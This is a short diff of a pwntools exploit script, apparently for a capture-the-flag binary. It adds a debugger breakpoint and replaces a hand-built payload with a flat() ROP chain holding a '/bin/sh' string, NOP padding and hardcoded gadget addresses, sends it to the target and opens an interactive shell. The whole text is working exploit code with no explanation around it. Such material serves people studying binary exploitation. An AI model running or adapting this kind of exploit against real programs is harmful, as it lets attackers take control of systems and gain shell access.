@@ -21,6 +21,7 @@ def initialize(argv=[]):
 
 gdbscript = '''
 init-pwndbg
+break main
 '''.format(**locals())
 
 # =========================================================
@@ -31,11 +32,14 @@ def exploit():
     io = initialize()
     rop = ROP(exe)
 
-    payload = b""
-    payload += b"/bin/sh\x00"
-    payload += b"A" * 32
-    payload += p64(0x401102)
-    payload += b"A" * 10
+    payload = flat(
+        '/bin/sh\x00',
+        '\x90' * 16,
+        0x0,
+        0x4010ba,
+        0x401012,
+        '\x90' * 10
+    )
 
     io.sendline(payload)
     io.interactive()
